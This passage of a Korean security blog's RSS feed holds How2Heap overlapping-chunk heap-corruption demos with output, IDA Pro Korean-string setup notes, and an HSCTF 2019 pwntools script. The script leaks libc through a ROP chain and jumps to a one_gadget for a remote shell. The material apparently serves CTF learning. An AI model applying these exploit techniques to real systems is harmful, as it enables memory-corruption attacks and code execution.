class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이 작업은 기본적으로 p3을 잘못 포함하는 큰 free chunk를 생성한다.\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이제 이전에 free된 chunk로 만족할 수 있는 크기의 새 chunk를 할당하자\n"</span>);</span><br><span class="line"></span><br><span class="line">p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nmalloc()은 우리의 만들어진 큰 free chunk에 의해 충족되었다. 이제 p6과 p3은 overlapping되어 우리는 p3에 있는 데이터를 p6 chunk에 쓰면서 overwrite할 수 있다."</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n%p ~ %p p6 chunk "</span>, p6,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p6+real_size_p6);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n%p ~ %p p3 chunk\n"</span>, p3, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) p3+real_size_p3); </span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np3 chunk의 data: \n\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np6안에 뭔가 써보자.\n"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------memset(p6,'F',1500)-------"</span>);</span><br><span class="line"><span class="built_in">memset</span>(p6,<span class="string">'F'</span>,<span class="number">1500</span>);  </span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np3 chunk의 data: \n\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>simple chunks overlapping problem</code><br>이것은 인접하지 않은 free chunk를 consolidate하는 공격으로도 참조된다.</p><p>heap에 chunk를 5개 할당한다.</p><p><code>0x603010 ~ 0x6033f8 p1 chunk</code><br><code>0x603400 ~ 0x6037e8 p2 chunk</code><br><code>0x6037f0 ~ 0x603bd8 p3 chunk</code><br><code>0x603be0 ~ 0x603fc8 p4 chunk</code><br><code>0x603fd0 ~ 0x6043b8 p5 chunk</code></p><p>p4 chunk를 <code>free</code>해보자. 이 경우, p4이후에 p5가 <code>top chunk</code>에 접하고 있어서 <code>top chunk</code>와 합쳐지지 않는다</p><p>사용 중인 p2 chunk의 크기를 chunk_p2 + chunk_p3크기로 overwrite하는 p1 chunk취약점을 트리거하자.</p><p>이제 p2에 free()동작 중에 할당자는 다음 chunk가 p4라고 생각한다. (p2 + p2의 크기가 p4를 가리키기 때문)</p><p>이 작업은 기본적으로 p3을 잘못 포함하는 큰 free chunk를 생성한다.</p><p>이제 이전에 free된 chunk로 만족할 수 있는 크기의 새 chunk를 할당하자</p><p>malloc()은 우리의 만들어진 큰 free chunk에 의해 충족되었다. 이제 p6과 p3은 overlapping되어 우리는 p3에 있는 데이터를 p6 chunk에 쓰면서 overwrite할 수 있다.<br><code>0x603400 ~ 0x603bd8 p6 chunk</code><br><code>0x6037f0 ~ 0x603bd8 p3 chunk</code></p><p><strong><code>p3 chunk의 data:</code></strong></p><p><codecode></p><p>p6안에 뭔가 써보자.<br>-------memset(p6,‘F’,1500)-------</p><p><strong><code>p3 chunk의 data:</code></strong></p><p><codecode></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/26/How2Heap-Overlapping-Chunks-2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>IDA Pro 7.2 한글 스트링 지원</title>
      <link>http://j0n9hyun.github.io/2019/06/24/IDA-Pro-7-2-%ED%95%9C%EA%B8%80-%EC%8A%A4%ED%8A%B8%EB%A7%81-%EC%A7%80%EC%9B%90/</link>
      <guid>http://j0n9hyun.github.io/2019/06/24/IDA-Pro-7-2-%ED%95%9C%EA%B8%80-%EC%8A%A4%ED%8A%B8%EB%A7%81-%EC%A7%80%EC%9B%90/</guid>
      <pubDate>Mon, 24 Jun 2019 10:04:12 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;ida-pro-72-한글-스트링-지원&quot;&gt;&lt;a class=&quot;m
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="ida-pro-72-한글-스트링-지원"><a class="markdownIt-Anchor" href="#ida-pro-72-한글-스트링-지원"></a> IDA Pro 7.2 한글 스트링 지원</h3><p>7.0 버전까지만 해도 clt 파일을 따로 추가해줘야 했는데 7.2 부턴 그냥 한줄 추가만 해주면 된다. <a href="http://egloos.zum.com/shadowxx/v/11310107" target="_blank" rel="noopener">제작자</a>가 파일을 보냈다고 했는데 회사에서 잘 반영해준 것 같다. 상단의 주석에도 IDA 사용자가 제공해줬다고 적혀있다.</p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60010989-d3e7b180-96b3-11e9-94e7-7a83b0a31d89.PNG"><center><small> [Korean.clt] </small><center> <br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60011395-a94a2880-96b4-11e9-8ae8-860ac2d98aa7.PNG"><center><small> [IDA Pro 7.2] </small><center> <br><style>  img.border-shadow{        border:1px solid #888888;        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);    }</style></center></center></center></center>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/24/IDA-Pro-7-2-%ED%95%9C%EA%B8%80-%EC%8A%A4%ED%8A%B8%EB%A7%81-%EC%A7%80%EC%9B%90/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] Overlapping_Chunks</title>
      <link>http://j0n9hyun.github.io/2019/06/20/How2Heap-Overlapping-Chunks/</link>
      <guid>http://j0n9hyun.github.io/2019/06/20/How2Heap-Overlapping-Chunks/</guid>
      <pubDate>Thu, 20 Jun 2019 13:59:02 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;overlapping_chunksc&quot;&gt;&lt;a class=&quot;ma
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="overlapping_chunksc"><a class="markdownIt-Anchor" href="#overlapping_chunksc"></a> Overlapping_Chunks.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 glibc에서 tcache옵션이 disabled된 상태에만 작동한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nsimple chunks overlapping\n\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"heap에 chunk 3개를 할당해보자.\n"</span>);</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3개의 chunk가 여기에 할당됐다:\np1=%p\np2=%p\np3=%p\n"</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1, <span class="string">'1'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p2, <span class="string">'2'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이제 p2 chunk를 free시켜보자\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p2 chuck는 이제 unsorted bin안에서 그 크기의 새로운 malloc()을 제공할 준비가 되어있다\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 p2를 free시킨 chunk의 크키를 overwrite할 수 있는 overflow를 시연해보자.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"toy 프로그램의 경우, 마지막 세 개의 bit값은 중요하지 않다;"</span></span><br><span class="line"><span class="string">"하지만, heap의 안정성을 유지하는 것이 베스트다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 안정성을 유지하기 위해 우리는 최하위 bit를 1(prev_inuse)로 표시할 것이다,"</span></span><br><span class="line"><span class="string">"p1이 free chunk로 오인하지 않고 확실히 하기 위해\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line"><span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 p2 chunk의 크기를 %d로 설정할 것이다, 그렇게 하는 것은 우리에게 \n%d의 region size를 준다.\n"</span>,</span><br><span class="line">evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// 우리는 p2 chunk의 "크기" field를 overwrite하고 있다.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이제 다른 chunk를 주입된 p2 chunk의 데이터 크기와 똑같은 크기에 할당해준다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 malloc은 우리가 크기를 바꾸었던, unsorted bin안에 있는, 전에 free되었던 chunk로부터 제공되어질 것이다.\n"</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4는 %p에 할당되었고 and %p에서 끝난다.\n"</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3는 %p에서 시작해 %p에서 끝난다\n"</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4는 p3와 overlap되어야한다, 이 경우에 p4는 모든 p3를 포함한다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이제 p4 chunk안에 복사된 모든 것들은 p3 chunk에 있는 데이터를 overwrite할 수 있다,"</span></span><br><span class="line"><span class="string">"그리고 p3 chunk에 쓰여진 데이터는 p4 chunk 안에 저장되어있는 데이터를 overwrite할 수 있다.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 예시를 돌려보자. 지금, 우리는 가지고 있다:\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIf we memset(p4, '4', %d), we have:\n"</span>, evil_region_size);</span><br><span class="line"><span class="built_in">memset</span>(p4, <span class="string">'4'</span>, evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이 기법은 glibc에서 tcache옵션이 disabled된 상태에만 작동한다.</p><p><code>simple chunks overlapping</code></p><p>heap에 chunk 3개를 할당해보자.<br>3개의 chunk가 여기에 할당됐다:<br><code>p1=0x603010</code><br><code>p2=0x603110</code><br><code>p3=0x603210</code></p><p>이제 p2 chunk를 free시켜보자<br>p2 chuck는 이제 unsorted bin안에서 그 크기의 새로운 malloc()을 제공할 준비가 되어있다<br>이제 p2를 free시킨 chunk의 크키를 overwrite할 수 있는 overflow를 시연해보자.<br>toy 프로그램의 경우, 마지막 세 개의 bit값은 중요하지 않다.<br>하지만, heap의 안정성을 유지하는 것이 베스트다.<br>이 안정성을 유지하기 위해 우리는 최하위 bit를 1(prev_inuse)로 표시할 것이다.<br>p1이 free chunk로 오인하지 않고 확실히 하기 위해 우리는 p2 chunk의 크기를 385로 설정할 것이다. 그렇게 하는 것은 우리에게 376의 region size를 준다.</p><p>이제 다른 chunk를 주입된 p2 chunk의 데이터 크기와 똑같은 크기에 할당해준다.<br>이 malloc은 우리가 크기를 바꾸었던, unsorted bin안에 있는, 전에 free되었던 chunk로부터 제공되어질 것이다.</p><p>p4는 <code>0x603110</code>에 할당되었고 <code>0x603288</code>에서 끝난다.<br>p3는 <code>0x603210</code>에서 시작해 <code>0x603288</code>에서 끝난다<br>p4는 p3와 overlap되어야한다, 이 경우에 p4는 모든 p3를 포함한다.</p><p>이제 p4 chunk안에 복사된 모든 것들은 p3 chunk에 있는 데이터를 overwrite할 수 있다<br>그리고 p3 chunk에 쓰여진 데이터는 p4 chunk 안에 저장되어있는 데이터를 overwrite할 수 있다.</p><p>이제 예시를 돌려보자. 지금, 우리는 가지고 있다:<br><code>p4 = x</code><br><code>3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333</code></p><p>If we memset(p4, ‘4’, 376), we have:<br><code>p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</code><br><code>p3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</code></p><p>And if we then memset(p3, ‘3’, 80), we have:<br><code>p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444</code><br><code>p3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444</code></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/20/How2Heap-Overlapping-Chunks/#disqus_thread</comments>
    </item>
    
    <item>
      <title>IDA Pro 한글 스트링 적용 방법</title>
      <link>http://j0n9hyun.github.io/2019/06/13/ida-7.0-korean-string-apply/</link>
      <guid>http://j0n9hyun.github.io/2019/06/13/ida-7.0-korean-string-apply/</guid>
      <pubDate>Thu, 13 Jun 2019 04:37:48 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;ida-pro-korean-string-적용-방법&quot;&gt;&lt;a c
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="ida-pro-korean-string-적용-방법"><a class="markdownIt-Anchor" href="#ida-pro-korean-string-적용-방법"></a> IDA Pro Korean String 적용 방법</h3><p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3284234/korean.zip" target="_blank" rel="noopener"><strong>패치 파일</strong></a></p><p>바이너리 파일에  영어가 아닌 다른 언어가 입력돼있으면 IDA에서는 <code>puts(byte_8048840)</code> 처럼 한글 그대로 나오지 않는 것을 볼 수 있다. 물론 대부분은 영어로 작성돼있고 이렇게 돼있는다 한들, 보는 데 크게 지장을 주진 않지만 그래도 한번 찾아본 결과, 방법을 알아볼 수 있었다.</p><center><p><strong><code>해당 설명은 IDA Pro 7.0 버전을 기준으로 설명한다.</code></strong></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/59404563-f2ab9580-8de1-11e9-82d1-00d5fa782281.PNG"><center><small> [IDA Pro] </small></center> <br>우선 위에 있는 패치 파일을 다운 받고 압축을 풀어서 IDA 설치 경로 안에 있는 cfg 폴더에 넣어준다.<p><code>기본경로:C:\Program Files\IDA 7.0\cfg</code><br><br></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/59404811-f986d800-8de2-11e9-871d-d51cd03012a8.PNG"><center><small> [ida.cfg] </small></center> <br>다음 ida.cfg 파일을 열어서 분홍박스처럼 한 줄 추가해주면 적용이 완료된다.(앞에 주석을 실수로 달았다. //는 빼주자)<br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/59404273-f0950700-8de0-11e9-9ff4-900da4536761.PNG"><center><small> [적용 화면] </small></center><center><p><strong><code>세 줄 요약</code><br><code>1. 패치 파일 다운 받아서 압축 품</code><br><code>2. 파일을 IDA 설치 경로에 있는 cfg 폴더 안에 넣음</code><br><code>3. ida.cfg 파일에 한 줄 추가함</code></strong></p></center><p><a href="http://m.egloos.zum.com/shadowxx/v/11310107" target="_blank" rel="noopener">Source</a></p><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style></center>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/13/ida-7.0-korean-string-apply/#disqus_thread</comments>
    </item>
    
    <item>
      <title>HSCTF 2019 Combo Chain</title>
      <link>http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/</link>
      <guid>http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/</guid>
      <pubDate>Sat, 08 Jun 2019 22:28:42 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;combo-chain&quot;&gt;&lt;a class=&quot;markdownIt
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="combo-chain"><a class="markdownIt-Anchor" href="#combo-chain"></a> Combo Chain</h3><p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3268976/combo-chain.zip" target="_blank" rel="noopener"><strong>Binary File</strong></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process('./combo-chain')</span></span><br><span class="line">r = remote(<span class="string">'pwn.hsctf.com'</span>, <span class="number">2345</span>)</span><br><span class="line">e = ELF(<span class="string">'./combo-chain'</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: r.sendafter(a, b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">gets_offset = libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">gets_got = e.got[<span class="string">'gets'</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">'printf'</span>]</span><br><span class="line">main = e.symbols[<span class="string">'main'</span>]</span><br><span class="line">pr = <span class="number">0x0000000000401263</span> <span class="comment"># pop rdi; ret</span></span><br><span class="line">nop = <span class="number">0x000000000040114f</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">16</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(gets_got)</span><br><span class="line">p += p64(nop)</span><br><span class="line">p += p64(printf_plt)</span><br><span class="line">p += p64(main)</span><br><span class="line">sla(<span class="string">": "</span>, p)</span><br><span class="line"></span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leaked)</span><br><span class="line">libc_base = leaked - gets_offset</span><br><span class="line">one_shot = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">16</span></span><br><span class="line">p += p64(one_shot)</span><br><span class="line">sla(<span class="string">": "</span>, p)</span><br><span class="line">ex()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] Poison_null_byte</title>
      <link>http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/</link>
      <guid>http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/</guid>
      <pubDate>Fri, 31 May 2019 02:18:06 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;poison_null_bytec&quot;&gt;&lt;a class=&quot;mark
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="poison_null_bytec"><a class="markdownIt-Anchor" href="#poison_null_bytec"></a> Poison_null_byte.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 